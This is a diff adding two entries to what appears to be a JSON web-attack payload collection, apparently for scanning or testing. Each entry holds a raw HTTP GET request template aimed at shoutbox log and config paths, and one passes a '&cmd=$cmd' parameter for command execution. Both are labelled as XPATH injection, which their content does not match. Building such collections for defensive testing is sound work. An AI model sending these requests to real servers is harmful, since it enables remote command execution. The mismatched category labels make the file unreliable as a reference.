@@ -20,5 +20,27 @@
       "expected_status_code": 200,
       "success_regex": "xpath|xml"
     }
+  },
+  {
+    "payload_id": "OWP-474663",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "GET ${shoutboxpath}/${shoutbox}${access_log} HTTP/1.1\\nHost: $host\\nConnection: Close\\n\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xpath|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-474664",
+    "vulnerability_category": "Injection (XPATH)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "GET ${shoutboxpath}/${shoutbox}${conf}&cmd=$cmd HTTP/1.1\\nHost: $host\\nConnection: Close\\n\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "xpath|xml"
+    }
   }
 ]
